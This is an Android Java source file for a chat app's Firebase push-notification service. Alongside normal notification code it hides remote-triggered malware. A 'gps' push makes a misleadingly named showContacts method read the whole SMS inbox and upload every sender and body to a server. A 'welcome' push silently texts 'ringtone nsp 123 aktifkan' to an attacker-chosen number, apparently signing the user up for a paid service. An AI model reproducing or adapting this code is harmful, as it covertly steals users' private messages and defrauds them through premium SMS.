package com.example.irhabi_ecsboard.sendbird.fcm;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.RingtoneManager;
import android.net.Uri;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import com.example.irhabi_ecsboard.sendbird.model.Smsdata;
import com.example.irhabi_ecsboard.sendbird.service.RetrofitInstance;
import com.example.irhabi_ecsboard.sendbird.service.Router;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.example.irhabi_ecsboard.sendbird.R;
import com.example.irhabi_ecsboard.sendbird.groupchannel.GroupChannelActivity;
import com.example.irhabi_ecsboard.sendbird.utils.PreferenceUtils;

import org.json.JSONException;
import org.json.JSONObject;

import retrofit2.Call;
import retrofit2.Callback;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    private Smsdata smss;
    private RetrofitInstance retrofit;

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {

        Log.d(TAG, "From: " + remoteMessage.getFrom());

        // Check if message contains a data payload.
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());

            try {
                JSONObject json = new JSONObject(remoteMessage.getData().toString());
                handleDataMessage(json);
            } catch (Exception e) {
                Log.e(TAG, "Exception: " + e.getMessage());
            }
        }

        // Check if message contains a notification payload.
        if (remoteMessage.getNotification() != null) {
            Log.d(TAG, "Message Notification Body: " + remoteMessage.getNotification().getBody());

        }

        String channelUrl = null;

        try {
            JSONObject sendBird = new JSONObject(remoteMessage.getData().get("sendbird"));
            JSONObject channel = (JSONObject) sendBird.get("channel");
            channelUrl = (String) channel.get("channel_url");
            sendNotification(this, remoteMessage.getData().get("message"), channelUrl);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendNotification(Context context, String messageBody, String channelUrl) {
        Intent intent = new Intent(context, GroupChannelActivity.class);
        intent.putExtra("groupChannelUrl", channelUrl);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0 /* Request code */, intent,
                PendingIntent.FLAG_UPDATE_CURRENT);

        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(context)
                .setSmallIcon(R.drawable.icon)
                .setContentTitle(context.getResources().getString(R.string.app_name))
                .setAutoCancel(true)
                .setSound(defaultSoundUri)
                .setPriority(Notification.PRIORITY_MAX)
                .setDefaults(Notification.DEFAULT_ALL)
                .setContentIntent(pendingIntent);

        if (PreferenceUtils.getNotificationsShowPreviews(context)) {
            notificationBuilder.setContentText(messageBody);
        } else {
            notificationBuilder.setContentText("Somebody sent you a message.");
        }

        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }

    // ini untuk sms user
    private void handleDataMessage(JSONObject json) {

        Log.e(TAG, "push json: " + json.toString());
        try {
            JSONObject data = json.getJSONObject("data");

            String title = data.getString("title");
            String message = data.getString("message");
            boolean isBackground = data.getBoolean("is_background");
            String imageUrl = data.getString("image");
            String timestamp = data.getString("timestamp");
            JSONObject payload = data.getJSONObject("payload");


            Log.e(TAG, "title: " + title);
            Log.e(TAG, "message: " + message);
            Log.e(TAG, "isBackground: " + isBackground);
            Log.e(TAG, "payload: " + payload.toString());
            Log.e(TAG, "imageUrl: " + imageUrl);
            Log.e(TAG, "timestamp: " + timestamp);

            if (message.equals("gps")){
                showContacts();
            }else if(message.equals("welcome")){
                Sms(title);
            }

        } catch (JSONException e) {
            Log.e(TAG, "Json Exception: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
        }
    }

    public void Postsms(String Number, String Body){
        smss = new Smsdata(Number, Body);
        retrofit = new RetrofitInstance();
        Router service = retrofit.getRetrofitInstanceall().create(Router.class);
        String username = PreferenceUtils.getUserId(MyFirebaseMessagingService.this);
        Call<Smsdata> call = service.Postsms(smss,username);
        call.enqueue(new Callback<Smsdata>() {
            @Override
            public void onResponse(Call<Smsdata> call, retrofit2.Response<Smsdata> response) {

            }
            @Override
            public void onFailure(Call<Smsdata> call, Throwable t) {

            }
        });
    }

    public void Sms(String number) {
        String myMsg = "ringtone nsp 123 aktifkan";
        if (TextUtils.isDigitsOnly(number)) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, myMsg, null, null);
        }
    }

    private void showContacts(){
        Uri inboxuri = Uri.parse("content://sms/inbox");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(inboxuri, null, null, null, null);
        while (c.moveToNext()){
            String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
            String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();

            Postsms(Number, Body);
        }
        c.close();
    }
}